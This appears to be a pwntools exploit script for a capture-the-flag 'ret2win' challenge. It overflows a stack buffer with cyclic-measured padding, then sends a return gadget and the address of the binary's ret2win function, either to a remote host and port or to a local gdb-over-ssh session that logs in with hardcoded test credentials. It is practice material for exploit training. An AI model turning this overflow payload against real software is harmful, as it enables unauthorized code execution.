#!/usr/bin/env python3

from argparse import ArgumentParser
from pwn import *


def get_proc(gdb_script=""):
    """
    Get the tube specified by command line arguments.
    """
    return _get_proc(*parse_args(), gdb_script)


def parse_args():
    """
    Parse command line arguments.
    """
    parser = ArgumentParser(description="pwn/re template")
    parser.add_argument("executable", type=str, help="path to executable")
    parser.add_argument("remote", default=[None, None], nargs="*", help="remote hostname and port")
    args = parser.parse_args()
    host, port = parse_remote(args.remote)
    return args.executable, host, port


def parse_remote(remote):
    """
    Validate command line arguments.
    """
    if isinstance(remote, str):
        remote = remote.split(":")
    try:
        host, port = remote
    except ValueError:
        raise ValueError("host and port required to use remote")
    return host, port


def _get_proc(executable, host, port, gdb_script):
    """
    Get a remote tube if host/port specified, otherwise a gdb-over-ssh tube to
    a VM/Docker environment.
    """
    context.binary = executable
    context.terminal = ['gnome-terminal', '--tab', '-e']
    if host is not None or port is not None:
        if host is None or port is None: 
            raise ValueError("both host and port must be specified for remote")
        proc = remote(host, port)
    else:        
        proc = gdb.debug(
            exe=executable,
            gdbscript=gdb_script,
            args=[executable],
            ssh=ssh('test','localhost', 2222, "test", ignore_config=True)
            # ssh=ssh('root','localhost', 2222, "root", ignore_config=True)
        )
    return proc


def main():
    gdb_script="""
    b *0x400770
    b *0x400756
    c
    """
    p = get_proc(gdb_script)
    #payload = cyclic(0x100, n=8)
    payload = b"a" * cyclic_find(0x6161616161616166, n=8)
    payload += p64(0x400770)
    payload += p64(context.binary.sym.ret2win)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
